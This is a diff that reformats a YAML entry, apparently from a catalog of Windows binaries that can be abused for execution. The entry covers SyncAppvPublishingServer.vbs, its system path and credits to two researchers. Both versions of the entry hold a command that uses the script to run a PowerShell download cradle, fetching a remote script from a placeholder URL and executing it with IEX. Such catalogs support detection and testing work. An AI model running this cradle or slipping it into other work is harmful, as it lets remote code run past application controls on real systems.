@@ -1,24 +1,14 @@
 ---
+name: syncappvpublishingserver.vbs
+description: 
 functions:
   execute:
-    -
-      Name: SyncAppvPublishingServer.vbs
-      Description: Execute
-      Author: ''
-      Created: '2018-05-25'
-      Categories: |
-      
-      Commands: |
-          Command: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
-          Description: Inject PowerShell script code with the provided arguments
-      Full_Path:
-          C:\Windows\System32\SyncAppvPublishingServer.vbs
-      Code_Sample: |
-          
-      Detection: |
-          
-      Resources: |
-          https://twitter.com/monoxgas/status/895045566090010624
-          https://twitter.com/subTee/status/855738126882316288
-      Notes: Thanks to Nick Landers - @monoxgas, Casey Smith - @subTee
+    - description: Inject PowerShell script code with the provided arguments
+      code: SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX"
+resources: 
+    - resource: https://twitter.com/monoxgas/status/895045566090010624
+    - resource: https://twitter.com/subTee/status/855738126882316288
+fullpath: 
+    - path: C:\Windows\System32\SyncAppvPublishingServer.vbs
+notes: Thanks to Nick Landers - @monoxgas, Casey Smith - @subTee
 ---
